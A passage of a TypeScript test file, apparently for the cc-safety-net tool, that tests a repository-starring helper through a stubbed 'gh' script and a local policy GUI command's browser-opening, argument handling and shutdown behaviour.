      '#!/bin/sh\nprintf "%s\\n" "$@" > "$STAR_LOG"\n/bin/sleep 0.1\nexit 0\n',
      'utf-8',
    );
    chmodSync(ghPath, 0o755);

    const originalStarLog = process.env.STAR_LOG;
    process.env.STAR_LOG = starLog;
    try {
      expect(await starRepo(ghPath)).toEqual({ ok: true });
      expect(readFileSync(starLog, 'utf-8')).toBe(
        'api\n-X\nPUT\n/user/starred/kenryu42/cc-safety-net\n',
      );
    } finally {
      restoreEnv('STAR_LOG', originalStarLog);
      rmSync(localTempDir, { recursive: true, force: true });
    }
  });

  test('runGuiCommand honors no-open and prints URL', async () => {
    let openedUrl: string | null = null;
    const output: string[] = [];
    const result = await runGuiCommand(['--no-open'], {
      userConfigDir: join(safetyNetHome, 'rules'),
      openBrowser: async (url) => {
        openedUrl = url;
      },
      keepAlive: false,
      log: (message) => output.push(message),
    });

    expect(result).toBe(0);
    expect(openedUrl).toBeNull();
    expect(output.join('\n')).toContain('http://127.0.0.1:');
  });

  test('runGuiCommand reports browser opener failures and keeps the URL visible', async () => {
    const gui = await runGuiForTest(safetyNetHome, {
      openBrowser: async () => {
        throw new Error('no browser');
      },
    });

    expect(gui.result).toBe(0);
    expect(gui.output).toContain('http://127.0.0.1:');
    expect(gui.errors).toContain('Failed to open browser: no browser');
    expect(gui.errors).toContain('Open this URL manually: http://127.0.0.1:');
  });

  test('runGuiCommand reports missing platform opener errors', async () => {
    const gui = await withPath(tempDir, () => runGuiForTest(safetyNetHome));

    expect(gui.result).toBe(0);
    expect(gui.output).toContain('http://127.0.0.1:');
    expect(gui.errors).toContain('Failed to open browser:');
    expect(gui.errors).toContain('Open this URL manually: http://127.0.0.1:');
  });

  test('runGuiCommand rejects unknown args and can stop on process signal', async () => {
    const errors: string[] = [];
    expect(
      await runGuiCommand(['--bad'], {
        error: (message) => errors.push(message),
      }),
    ).toBe(1);
    expect(errors.join('\n')).toContain('Usage: cc-safety-net gui [--no-open]');

    const output: string[] = [];
    const run = runGuiCommand(['--no-open'], {
      userConfigDir: join(safetyNetHome, 'rules'),
      log: (message) => output.push(message),
    });
    while (output.length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    process.emit('SIGTERM', 'SIGTERM');

    expect(await run).toBe(0);
    expect(output.join('\n')).toContain('http://127.0.0.1:');
  });
});

async function getJson<T>(url: string): Promise<T> {
  const response = await fetch(url);
  expect(response.status).toBe(200);
  return (await response.json()) as T;
}

async function postJson<T>(url: string, token: string, body: unknown): Promise<T> {
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': token },
    body: JSON.stringify(body),
  });
  expect(response.status).toBe(200);
  return (await response.json()) as T;
}

async function repairPolicyViaApi(
  safetyNetHome: string,
  server: Awaited<ReturnType<typeof createPolicyGuiServer>>,
): Promise<unknown> {
  const repair = await postJson<WriteApiResponse>(
    `${server.origin}/api/repair?token=${server.token}`,
    server.token,
    {},
  );
  expect(repair.errors).toEqual([]);
  return JSON.parse(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')) as unknown;
}

async function runGuiForTest(
  safetyNetHome: string,
  options: Parameters<typeof runGuiCommand>[1] = {},
) {
  const output: string[] = [];
  const errors: string[] = [];
  return {
    result: await runGuiCommand([], {
      userConfigDir: join(safetyNetHome, 'rules'),
      ...options,
      keepAlive: false,
      log: (message) => output.push(message),
      error: (message) => errors.push(message),
    }),
    output: output.join('\n'),
    errors: errors.join('\n'),
  };
}

async function withPath<T>(pathValue: string, fn: () => Promise<T>): Promise<T> {
  const originalPath = process.env.PATH;
  const originalPathAlt = process.env.Path;
  process.env.PATH = pathValue;
  if (process.platform === 'win32') process.env.Path = pathValue;
  try {
    return await fn();
  } finally {
    restoreEnv('PATH', originalPath);
    restoreEnv('Path', originalPathAlt);
  }
}

function restoreEnv(name: string, value: string | undefined): void {
  if (value === undefined) {
    delete process.env[name];
    return;
  }
  process.env[name] = value;
}
